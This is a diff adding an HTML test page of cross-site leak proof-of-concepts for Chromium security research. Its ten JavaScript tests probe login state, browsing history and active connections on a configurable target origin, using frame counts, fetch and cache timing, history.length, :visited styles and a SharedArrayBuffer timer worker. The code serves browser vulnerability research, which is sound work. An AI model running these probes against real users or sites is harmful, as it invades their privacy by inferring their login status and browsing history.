@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<!--
+  XS-Leak Timing Attack PoCs - Chrome VRP Security Research
+  ==========================================================
+  Tests for cross-site information leaks via various timing
+  and side-channel techniques in Chromium.
+  
+  Serve from localhost:8888 and configure TARGET_ORIGIN below.
+-->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>XS-Leak Timing PoCs - Chrome VRP</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { 
+    font-family: 'Courier New', monospace; 
+    background: #0a0a0a; 
+    color: #e0e0e0; 
+    padding: 20px;
+  }
+  h1 { color: #ff6b6b; margin-bottom: 10px; font-size: 1.4em; }
+  h2 { color: #ffd93d; margin: 15px 0 5px; font-size: 1.1em; }
+  .config { 
+    background: #1a1a2e; 
+    padding: 15px; 
+    border-radius: 8px; 
+    margin-bottom: 20px;
+    border-left: 3px solid #4ecdc4;
+  }
+  .config label { display: block; margin: 5px 0; }
+  .config input { 
+    background: #16213e; 
+    border: 1px solid #4ecdc4; 
+    color: #e0e0e0; 
+    padding: 5px 10px; 
+    font-family: monospace;
+    width: 400px;
+  }
+  #results { 
+    max-height: 70vh; 
+    overflow-y: auto; 
+    background: #111; 
+    padding: 10px; 
+    border-radius: 8px;
+  }
+  .test-group { 
+    border: 1px solid #333; 
+    margin: 10px 0; 
+    padding: 10px; 
+    border-radius: 5px;
+  }
+  .result { padding: 3px 8px; margin: 2px 0; font-size: 0.85em; }
+  .SAFE { color: #2ecc71; }
+  .SUSPICIOUS { color: #f39c12; }
+  .VULNERABLE { color: #e74c3c; }
+  .INFO { color: #3498db; }
+  button { 
+    background: #e74c3c; 
+    color: white; 
+    border: none; 
+    padding: 10px 25px; 
+    cursor: pointer; 
+    font-family: monospace;
+    font-size: 1em;
+    border-radius: 5px;
+    margin: 5px;
+  }
+  button:hover { background: #c0392b; }
+  button:disabled { background: #555; cursor: not-allowed; }
+  .progress { color: #4ecdc4; margin: 10px 0; }
+  /* CSS :visited test styles */
+  #visited-test a { text-decoration: none; display: inline-block; }
+  #visited-test a:link { color: #333; }
+  #visited-test a:visited { color: #333; }
+</style>
+</head>
+<body>
+
+<h1>XS-Leak Timing Attack PoCs</h1>
+<p style="color:#888; margin-bottom:15px;">Chrome VRP Security Research - Cross-Site Information Leaks</p>
+
+<div class="config">
+  <label>Target Origin: 
+    <input type="text" id="targetOrigin" value="https://example.com" placeholder="https://target.com">
+  </label>
+  <label>Target URL (for fetch tests): 
+    <input type="text" id="targetUrl" value="https://example.com/" placeholder="https://target.com/page">
+  </label>
+  <label>Known Cached Resource: 
+    <input type="text" id="cachedResource" value="https://example.com/favicon.ico" placeholder="URL likely cached">
+  </label>
+  <br>
+  <button onclick="runAllTests()">Run All XS-Leak Tests</button>
+  <button onclick="clearResults()">Clear</button>
+</div>
+
+<div class="progress" id="progress"></div>
+<div id="results"></div>
+
+<!-- Hidden elements for tests -->
+<div id="visited-test" style="position:absolute;left:-9999px;"></div>
+<iframe id="hidden-frame" style="display:none;" sandbox="allow-same-origin"></iframe>
+
+<script>
+// ============================================================
+// Configuration & Utilities
+// ============================================================
+const getTarget = () => document.getElementById('targetOrigin').value;
+const getTargetUrl = () => document.getElementById('targetUrl').value;
+const getCachedResource = () => document.getElementById('cachedResource').value;
+
+const resultsDiv = document.getElementById('results');
+let testGroupDiv = null;
+
+function clearResults() {
+  resultsDiv.innerHTML = '';
+  document.getElementById('progress').textContent = '';
+}
+
+function startGroup(name) {
+  testGroupDiv = document.createElement('div');
+  testGroupDiv.className = 'test-group';
+  testGroupDiv.innerHTML = `<h2>${name}</h2>`;
+  resultsDiv.appendChild(testGroupDiv);
+}
+
+function logResult(severity, message) {
+  const div = document.createElement('div');
+  div.className = `result ${severity}`;
+  const icon = { SAFE: '🟢', SUSPICIOUS: '🟡', VULNERABLE: '🔴', INFO: 'ℹ️' }[severity] || '';
+  div.textContent = `${icon} [${severity}] ${message}`;
+  (testGroupDiv || resultsDiv).appendChild(div);
+  console.log(`[${severity}] ${message}`);
+}
+
+function setProgress(msg) {
+  document.getElementById('progress').textContent = msg;
+}
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+/**
+ * High-resolution timing helper.
+ * Uses performance.now() which should have reduced precision
+ * in cross-origin contexts due to Spectre mitigations.
+ */
+function hrtime() {
+  return performance.now();
+}
+
+// ============================================================
+// Test 1: Frame Counting (window.length)
+// ============================================================
+async function testFrameCounting() {
+  startGroup('1. Frame Counting (window.length)');
+  
+  try {
+    // Open target in a new window and check frame count
+    const urls = [
+      getTargetUrl(),
+      getTarget() + '/login',
+      getTarget() + '/dashboard',
+      getTarget() + '/about',
+    ];
+
+    for (const url of urls) {
+      try {
+        const win = window.open(url, '_blank', 'width=1,height=1,left=-9999');
+        if (!win) {
+          logResult('INFO', `Popup blocked for ${url}`);
+          continue;
+        }
+
+        await sleep(2000); // Wait for page to load
+
+        try {
+          const frameCount = win.length;
+          logResult('SUSPICIOUS',
+            `Frame count for ${url}: ${frameCount} (cross-origin frame count leaked)`);
+        } catch (e) {
+          logResult('SAFE', `Cannot read frame count for ${url}: ${e.message}`);
+        }
+
+        win.close();
+      } catch (e) {
+        logResult('INFO', `Error testing ${url}: ${e.message}`);
+      }
+    }
+  } catch (e) {
+    logResult('INFO', `Frame counting test error: ${e.message}`);
+  }
+}
+
+// ============================================================
+// Test 2: Fetch Timing
+// ============================================================
+async function testFetchTiming() {
+  startGroup('2. Fetch Response Timing');
+
+  const url = getTargetUrl();
+  const timings = [];
+  const iterations = 10;
+
+  // Test with different modes and credentials
+  const configs = [
+    { mode: 'no-cors', credentials: 'omit', label: 'no-cors/omit' },
+    { mode: 'no-cors', credentials: 'include', label: 'no-cors/include' },
+    { mode: 'cors', credentials: 'omit', label: 'cors/omit' },
+  ];
+
+  for (const config of configs) {
+    const times = [];
+    for (let i = 0; i < iterations; i++) {
+      const cacheBuster = `?_cb=${Date.now()}_${i}_${Math.random()}`;
+      const start = hrtime();
+      try {
+        const resp = await fetch(url + cacheBuster, {
+          mode: config.mode,
+          credentials: config.credentials,
+          cache: 'no-store',
+        });
+        const end = hrtime();
+        times.push(end - start);
+      } catch (e) {
+        const end = hrtime();
+        times.push(end - start);
+      }
+    }
+
+    const avg = times.reduce((a, b) => a + b, 0) / times.length;
+    const stddev = Math.sqrt(times.map(t => (t - avg) ** 2).reduce((a, b) => a + b, 0) / times.length);
+    
+    logResult('INFO',
+      `${config.label}: avg=${avg.toFixed(2)}ms stddev=${stddev.toFixed(2)}ms`);
+    
+    timings.push({ config: config.label, avg, stddev, times });
+  }
+
+  // Compare authenticated vs unauthenticated timing
+  if (timings.length >= 2) {
+    const diff = Math.abs(timings[0].avg - timings[1].avg);
+    if (diff > 50) {
+      logResult('SUSPICIOUS',
+        `Timing difference between auth states: ${diff.toFixed(2)}ms (may leak auth status)`);
+    } else {
+      logResult('SAFE', `Timing difference negligible: ${diff.toFixed(2)}ms`);
+    }
+  }
+}
+
+// ============================================================
+// Test 3: Cache Probing
+// ============================================================
+async function testCacheProbing() {
+  startGroup('3. Cache Probing');
+
+  const resource = getCachedResource();
+
+  // Step 1: Measure time for first load (likely uncached)
+  const uncachedTimes = [];
+  for (let i = 0; i < 5; i++) {
+    const cacheBuster = `?_nocache=${Date.now()}_${Math.random()}`;
+    const start = hrtime();
+    try {
+      await fetch(resource + cacheBuster, { mode: 'no-cors', cache: 'no-store' });
+    } catch (e) {}
+    uncachedTimes.push(hrtime() - start);
+    await sleep(100);
+  }
+
+  // Step 2: Load the resource normally (may cache it)
+  try {
+    await fetch(resource, { mode: 'no-cors', cache: 'default' });
+  } catch (e) {}
+  await sleep(200);
+
+  // Step 3: Measure time for subsequent load (possibly cached)
+  const cachedTimes = [];
+  for (let i = 0; i < 5; i++) {
+    const start = hrtime();
+    try {
+      await fetch(resource, { mode: 'no-cors', cache: 'default' });
+    } catch (e) {}
+    cachedTimes.push(hrtime() - start);
+    await sleep(50);
+  }
+
+  const avgUncached = uncachedTimes.reduce((a, b) => a + b, 0) / uncachedTimes.length;
+  const avgCached = cachedTimes.reduce((a, b) => a + b, 0) / cachedTimes.length;
+  const ratio = avgUncached / avgCached;
+
+  logResult('INFO', `Uncached avg: ${avgUncached.toFixed(2)}ms`);
+  logResult('INFO', `Cached avg: ${avgCached.toFixed(2)}ms`);
+  logResult('INFO', `Ratio (uncached/cached): ${ratio.toFixed(2)}x`);
+
+  if (ratio > 2) {
+    logResult('SUSPICIOUS',
+      `Cache timing difference detectable: ${ratio.toFixed(2)}x speedup — can infer browsing history`);
+  } else {
+    logResult('SAFE', 'Cache partitioning appears effective');
+  }
+}
+
+// ============================================================
+// Test 4: Error vs Load Event Timing
+// ============================================================
+async function testErrorLoadTiming() {
+  startGroup('4. Error/Load Event Timing');
+
+  const urls = [
+    { url: getTarget() + '/favicon.ico', label: 'favicon (should exist)' },
+    { url: getTarget() + '/nonexistent_' + Math.random(), label: 'nonexistent URL' },
+    { url: getTarget() + '/login', label: 'login page' },
+  ];
+
+  for (const { url, label } of urls) {
+    const result = await new Promise((resolve) => {
+      const img = new Image();
+      const start = hrtime();
+
+      img.onload = () => {
+        const elapsed = hrtime() - start;
+        resolve({ event: 'load', elapsed, label });
+      };
+      img.onerror = () => {
+        const elapsed = hrtime() - start;
+        resolve({ event: 'error', elapsed, label });
+      };
+
+      setTimeout(() => resolve({ event: 'timeout', elapsed: 5000, label }), 5000);
+      img.src = url + '?_t=' + Date.now();
+    });
+
+    logResult('INFO',
+      `${result.label}: event=${result.event}, time=${result.elapsed.toFixed(2)}ms`);
+
+    if (result.event === 'load') {
+      logResult('SUSPICIOUS',
+        `Cross-origin resource loaded as image — type can be inferred`);
+    }
+  }
+
+  // Script tag timing
+  for (const { url, label } of urls.slice(0, 2)) {
+    const result = await new Promise((resolve) => {
+      const script = document.createElement('script');
+      const start = hrtime();
+
+      script.onload = () => {
+        const elapsed = hrtime() - start;
+        document.head.removeChild(script);
+        resolve({ event: 'load', elapsed, label });
+      };
+      script.onerror = () => {
+        const elapsed = hrtime() - start;
+        try { document.head.removeChild(script); } catch (e) {}
+        resolve({ event: 'error', elapsed, label });
+      };
+
+      setTimeout(() => {
+        try { document.head.removeChild(script); } catch (e) {}
+        resolve({ event: 'timeout', elapsed: 5000, label });
+      }, 5000);
+
+      script.src = url + '?_t=' + Date.now();
+      document.head.appendChild(script);
+    });
+
+    logResult('INFO',
+      `Script load ${result.label}: event=${result.event}, time=${result.elapsed.toFixed(2)}ms`);
+  }
+}
+
+// ============================================================
+// Test 5: History Length Leak
+// ============================================================
+async function testHistoryLength() {
+  startGroup('5. History Length Leak');
+
+  const beforeLength = history.length;
+  logResult('INFO', `Current history.length: ${beforeLength}`);
+
+  // Opening cross-origin page in iframe and checking if history changes
+  const iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.sandbox = 'allow-same-origin';
+  document.body.appendChild(iframe);
+
+  try {
+    iframe.src = getTarget();
+    await sleep(2000);
+
+    const afterLength = history.length;
+    if (afterLength !== beforeLength) {
+      logResult('SUSPICIOUS',
+        `History length changed from ${beforeLength} to ${afterLength} after cross-origin iframe navigation`);
+    } else {
+      logResult('SAFE', 'History length unchanged by cross-origin iframe');
+    }
+  } catch (e) {
+    logResult('INFO', `History test error: ${e.message}`);
+  }
+
+  document.body.removeChild(iframe);
+
+  // Test with window.open
+  try {
+    const win = window.open('about:blank', '_blank', 'width=1,height=1');
+    if (win) {
+      const initialHL = win.history.length;
+      win.location = getTarget();
+      await sleep(2000);
+      
+      try {
+        const newHL = win.history.length;
+        logResult('SUSPICIOUS',
+          `Can read cross-origin window history.length: ${newHL}`);
+      } catch (e) {
+        logResult('SAFE', `Cannot read cross-origin history.length: ${e.message}`);
+      }
+      win.close();
+    }
+  } catch (e) {
+    logResult('INFO', `Window.open history test: ${e.message}`);
+  }
+}
+
+// ============================================================
+// Test 6: Connection Pool Timing
+// ============================================================
+async function testConnectionPoolTiming() {
+  startGroup('6. Connection Pool Timing');
+
+  // Chrome limits connections per origin. If the target has
+  // active connections, new requests will be delayed.
+
+  const url = getTargetUrl();
+  
+  // Measure baseline timing
+  const baseline = [];
+  for (let i = 0; i < 3; i++) {
+    const start = hrtime();
+    try {
+      await fetch(url + `?pool_baseline_${i}_${Date.now()}`, {
+        mode: 'no-cors',
+        cache: 'no-store'
+      });
+    } catch (e) {}
+    baseline.push(hrtime() - start);
+    await sleep(100);
+  }
+
+  const avgBaseline = baseline.reduce((a,b) => a+b, 0) / baseline.length;
+  logResult('INFO', `Baseline request time: ${avgBaseline.toFixed(2)}ms`);
+
+  // Now try to saturate connections
+  const concurrent = [];
+  for (let i = 0; i < 10; i++) {
+    concurrent.push(
+      fetch(url + `?pool_saturate_${i}_${Date.now()}`, {
+        mode: 'no-cors',
+        cache: 'no-store'
+      }).catch(() => {})
+    );
+  }
+
+  // Immediately measure while connections are busy
+  const saturated = [];
+  for (let i = 0; i < 3; i++) {
+    const start = hrtime();
+    try {
+      await fetch(url + `?pool_test_${i}_${Date.now()}`, {
+        mode: 'no-cors',
+        cache: 'no-store'
+      });
+    } catch (e) {}
+    saturated.push(hrtime() - start);
+  }
+
+  await Promise.allSettled(concurrent);
+
+  const avgSaturated = saturated.reduce((a,b) => a+b, 0) / saturated.length;
+  logResult('INFO', `Saturated request time: ${avgSaturated.toFixed(2)}ms`);
+
+  const ratio = avgSaturated / avgBaseline;
+  if (ratio > 1.5) {
+    logResult('SUSPICIOUS',
+      `Connection pool saturation detectable: ${ratio.toFixed(2)}x slower (can infer active connections to target)`);
+  } else {
+    logResult('SAFE', `Connection pool timing ratio: ${ratio.toFixed(2)}x`);
+  }
+}
+
+// ============================================================
+// Test 7: CSS :visited Leak
+// ============================================================
+async function testVisitedLeak() {
+  startGroup('7. CSS :visited Leak Attempts');
+
+  const testUrls = [
+    'https://www.google.com',
+    'https://www.facebook.com',
+    'https://www.twitter.com',
+    'https://www.github.com',
+    'https://www.reddit.com',
+    getTarget(),
+  ];
+
+  const container = document.getElementById('visited-test');
+  container.innerHTML = '';
+
+  // Method 1: getComputedStyle color check
+  for (const url of testUrls) {
+    const link = document.createElement('a');
+    link.href = url;
+    link.textContent = 'test';
+    link.style.display = 'inline-block';
+    container.appendChild(link);
+
+    await sleep(50); // Allow style computation
+
+    const style = getComputedStyle(link);
+    const color = style.color;
+    
+    // Modern browsers restrict :visited to color/background-color/border-color
+    // and getComputedStyle always returns unvisited style
+    logResult('INFO', `${url}: computed color = ${color}`);
+  }
+
+  // Check if all colors are the same (expected: yes, due to privacy protection)
+  const links = container.querySelectorAll('a');
+  const colors = [...links].map(l => getComputedStyle(l).color);
+  const allSame = colors.every(c => c === colors[0]);
+
+  if (allSame) {
+    logResult('SAFE', ':visited colors all identical via getComputedStyle (privacy protection working)');
+  } else {
+    logResult('VULNERABLE', ':visited color difference detected — history leak possible');
+  }
+
+  // Method 2: Timing-based :visited detection via requestAnimationFrame
+  try {
+    const testLink = document.createElement('a');
+    testLink.href = 'https://www.google.com';
+    testLink.textContent = 'test';
+    
+    // Apply complex styles that differ for :visited
+    const styleEl = document.createElement('style');
+    styleEl.textContent = `
+      #visited-timing-test a:link { outline: 1px solid transparent; }
+      #visited-timing-test a:visited { outline: 1px solid transparent; }
+    `;
+    document.head.appendChild(styleEl);
+    
+    const div = document.createElement('div');
+    div.id = 'visited-timing-test';
+    div.appendChild(testLink);
+    document.body.appendChild(div);
+    
+    // Measure paint timing
+    const paintTimes = [];
+    for (let i = 0; i < 10; i++) {
+      const start = hrtime();
+      await new Promise(resolve => requestAnimationFrame(resolve));
+      paintTimes.push(hrtime() - start);
+    }
+    
+    const avgPaint = paintTimes.reduce((a,b) => a+b, 0) / paintTimes.length;
+    logResult('INFO', `Paint timing with :visited styles: ${avgPaint.toFixed(2)}ms`);
+    
+    document.body.removeChild(div);
+    document.head.removeChild(styleEl);
+  } catch (e) {
+    logResult('INFO', `:visited timing test error: ${e.message}`);
+  }
+
+  container.innerHTML = '';
+}
+
+// ============================================================
+// Test 8: postMessage Timing Channel
+// ============================================================
+async function testPostMessageTiming() {
+  startGroup('8. postMessage Timing Channel');
+
+  // Test 1: postMessage round-trip to cross-origin iframe
+  try {
+    const iframe = document.createElement('iframe');
+    iframe.src = getTarget();
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    
+    await sleep(2000);
+
+    // Measure postMessage delivery time
+    const times = [];
+    for (let i = 0; i < 10; i++) {
+      const start = hrtime();
+      try {
+        iframe.contentWindow.postMessage('ping', '*');
+      } catch (e) {}
+      // Can't measure round-trip without cooperation, but measure send time
+      times.push(hrtime() - start);
+    }
+
+    const avg = times.reduce((a,b) => a+b, 0) / times.length;
+    logResult('INFO', `postMessage send time to cross-origin iframe: ${avg.toFixed(4)}ms`);
+
+    document.body.removeChild(iframe);
+  } catch (e) {
+    logResult('INFO', `postMessage iframe test: ${e.message}`);
+  }
+
+  // Test 2: BroadcastChannel timing (same-origin only but tests isolation)
+  try {
+    const bc = new BroadcastChannel('xsleak-test');
+    const times = [];
+
+    const handler = (e) => {};
+    bc.addEventListener('message', handler);
+
+    for (let i = 0; i < 100; i++) {
+      const start = hrtime();
+      bc.postMessage({ i, ts: Date.now() });
+      times.push(hrtime() - start);
+    }
+
+    const avg = times.reduce((a,b) => a+b, 0) / times.length;
+    logResult('INFO', `BroadcastChannel postMessage time: ${avg.toFixed(4)}ms`);
+
+    bc.removeEventListener('message', handler);
+    bc.close();
+  } catch (e) {
+    logResult('INFO', `BroadcastChannel: ${e.message}`);
+  }
+
+  // Test 3: Message port timing
+  try {
+    const mc = new MessageChannel();
+    const times = [];
+
+    mc.port2.onmessage = () => {};
+    mc.port2.start();
+
+    for (let i = 0; i < 100; i++) {
+      const start = hrtime();
+      mc.port1.postMessage(i);
+      times.push(hrtime() - start);
+    }
+
+    const avg = times.reduce((a,b) => a+b, 0) / times.length;
+    logResult('INFO', `MessageChannel port timing: ${avg.toFixed(4)}ms`);
+
+    mc.port1.close();
+    mc.port2.close();
+  } catch (e) {
+    logResult('INFO', `MessageChannel: ${e.message}`);
+  }
+}
+
+// ============================================================
+// Test 9: SharedArrayBuffer Timing
+// ============================================================
+async function testSharedArrayBufferTiming() {
+  startGroup('9. SharedArrayBuffer Timing');
+
+  if (typeof SharedArrayBuffer === 'undefined') {
+    logResult('SAFE', 'SharedArrayBuffer not available (COOP/COEP not set or disabled)');
+    logResult('INFO', 'To enable: serve with Cross-Origin-Opener-Policy: same-origin and Cross-Origin-Embedder-Policy: require-corp');
+    return;
+  }
+
+  try {
+    // Create a high-resolution timer using SharedArrayBuffer
+    const sab = new SharedArrayBuffer(8);
+    const counter = new BigInt64Array(sab);
+
+    // In a real attack, a worker would increment this continuously
+    // to create a high-res timer bypassing performance.now() restrictions
+    logResult('SUSPICIOUS',
+      'SharedArrayBuffer available — high-resolution timer can be constructed');
+
+    // Test Atomics timing
+    const timingBuf = new SharedArrayBuffer(4);
+    const timingView = new Int32Array(timingBuf);
+
+    const atomicsTimes = [];
+    for (let i = 0; i < 1000; i++) {
+      const start = hrtime();
+      Atomics.store(timingView, 0, i);
+      Atomics.load(timingView, 0);
+      atomicsTimes.push(hrtime() - start);
+    }
+
+    const avg = atomicsTimes.reduce((a,b) => a+b, 0) / atomicsTimes.length;
+    const min = Math.min(...atomicsTimes);
+    const max = Math.max(...atomicsTimes);
+    
+    logResult('INFO',
+      `Atomics timing resolution: avg=${avg.toFixed(4)}ms min=${min.toFixed(4)}ms max=${max.toFixed(4)}ms`);
+
+    // Test if we can create a high-res timer worker
+    try {
+      const workerCode = `
+        const sab = new SharedArrayBuffer(8);
+        const counter = new BigInt64Array(sab);
+        self.postMessage(sab);
+        while (true) {
+          Atomics.add(counter, 0, 1n);
+        }
+      `;
+      const blob = new Blob([workerCode], { type: 'application/javascript' });
+      const worker = new Worker(URL.createObjectURL(blob));
+      
+      const workerSAB = await new Promise((resolve, reject) => {
+        worker.onmessage = (e) => resolve(e.data);
+        worker.onerror = (e) => reject(e);
+        setTimeout(() => reject(new Error('timeout')), 2000);
+      });
+
+      const workerCounter = new BigInt64Array(workerSAB);
+      
+      // Sample timing resolution
+      await sleep(100);
+      const v1 = Atomics.load(workerCounter, 0);
+      await sleep(1);
+      const v2 = Atomics.load(workerCounter, 0);
+      
+      const incrementsPerMs = Number(v2 - v1);
+      logResult('SUSPICIOUS',
+        `SAB timer resolution: ~${incrementsPerMs} increments/ms`);
+
+      worker.terminate();
+    } catch (e) {
+      logResult('INFO', `SAB worker timer: ${e.message}`);
+    }
+
+  } catch (e) {
+    logResult('INFO', `SharedArrayBuffer test: ${e.message}`);
+  }
+}
+
+// ============================================================
+// Test 10: Performance API Leaks
+// ============================================================
+async function testPerformanceAPILeaks() {
+  startGroup('10. Performance API Cross-Origin Leaks');
+
+  // Test Resource Timing API for cross-origin info
+  try {
+    // Load a cross-origin resource
+    const url = getTargetUrl();
+    try {
+      await fetch(url + '?perf_test=' + Date.now(), { mode: 'no-cors' });
+    } catch (e) {}
+
+    await sleep(500);
+
+    const entries = performance.getEntriesByType('resource');
+    const crossOriginEntries = entries.filter(e => {
+      try {
+        const u = new URL(e.name);
+        return u.origin !== location.origin;
+      } catch (err) { return false; }
+    });
+
+    for (const entry of crossOriginEntries.slice(-5)) {
+      const info = {
+        name: entry.name.substring(0, 80),
+        duration: entry.duration,
+        transferSize: entry.transferSize,
+        encodedSize: entry.encodedBodySize,
+        decodedSize: entry.decodedBodySize,
+        type: entry.initiatorType,
+        nextHopProtocol: entry.nextHopProtocol,
+      };
+
+      logResult('INFO', `Resource: ${info.name}`);
+      
+      // Check if timing info is available (should be zeroed for cross-origin without TAO)
+      if (entry.transferSize > 0) {
+        logResult('SUSPICIOUS',
+          `Cross-origin transferSize leaked: ${entry.transferSize} bytes`);
+      }
+      if (entry.duration > 0 && entry.responseStart > 0) {
+        logResult('INFO',
+          `Duration: ${entry.duration.toFixed(2)}ms, responseStart: ${entry.responseStart.toFixed(2)}`);
+      }
+      if (entry.nextHopProtocol) {
+        logResult('INFO', `Protocol: ${entry.nextHopProtocol}`);
+      }
+    }
+
+    // Check if Timing-Allow-Origin is respected
+    const taoEntries = crossOriginEntries.filter(e => e.responseStart > 0);
+    if (taoEntries.length > 0) {
+      logResult('SUSPICIOUS',
+        `${taoEntries.length} cross-origin entries expose detailed timing (TAO header present?)`);
+    } else {
+      logResult('SAFE', 'Cross-origin timing details properly restricted');
+    }
+  } catch (e) {
+    logResult('INFO', `Performance API: ${e.message}`);
+  }
+
+  // Test Navigation Timing
+  try {
+    const navEntries = performance.getEntriesByType('navigation');
+    if (navEntries.length > 0) {
+      const nav = navEntries[0];
+      logResult('INFO',
+        `Navigation: DNS=${(nav.domainLookupEnd - nav.domainLookupStart).toFixed(2)}ms, ` +
+        `Connect=${(nav.connectEnd - nav.connectStart).toFixed(2)}ms, ` +
+        `TTFB=${(nav.responseStart - nav.requestStart).toFixed(2)}ms`);
+    }
+  } catch (e) {}
+}
+
+// ============================================================
+// Main Runner
+// ============================================================
+async function runAllTests() {
+  clearResults();
+  const totalStart = hrtime();
+  
+  const tests = [
+    { name: 'Frame Counting', fn: testFrameCounting },
+    { name: 'Fetch Timing', fn: testFetchTiming },
+    { name: 'Cache Probing', fn: testCacheProbing },
+    { name: 'Error/Load Event Timing', fn: testErrorLoadTiming },
+    { name: 'History Length', fn: testHistoryLength },
+    { name: 'Connection Pool Timing', fn: testConnectionPoolTiming },
+    { name: 'CSS :visited', fn: testVisitedLeak },
+    { name: 'postMessage Timing', fn: testPostMessageTiming },
+    { name: 'SharedArrayBuffer Timing', fn: testSharedArrayBufferTiming },
+    { name: 'Performance API Leaks', fn: testPerformanceAPILeaks },
+  ];
+
+  for (let i = 0; i < tests.length; i++) {
+    setProgress(`Running test ${i + 1}/${tests.length}: ${tests[i].name}...`);
+    try {
+      await tests[i].fn();
+    } catch (e) {
+      logResult('INFO', `Test "${tests[i].name}" threw: ${e.message}`);
+    }
+    await sleep(200);
+  }
+
+  const elapsed = ((hrtime() - totalStart) / 1000).toFixed(1);
+  setProgress(`All tests complete in ${elapsed}s`);
+
+  // Summary
+  startGroup('Summary');
+  const allResults = document.querySelectorAll('.result');
+  let safe = 0, suspicious = 0, vulnerable = 0;
+  allResults.forEach(r => {
+    if (r.classList.contains('SAFE')) safe++;
+    if (r.classList.contains('SUSPICIOUS')) suspicious++;
+    if (r.classList.contains('VULNERABLE')) vulnerable++;
+  });
+  logResult('INFO', `🟢 SAFE: ${safe} | 🟡 SUSPICIOUS: ${suspicious} | 🔴 VULNERABLE: ${vulnerable}`);
+}
+</script>
+</body>
+</html>
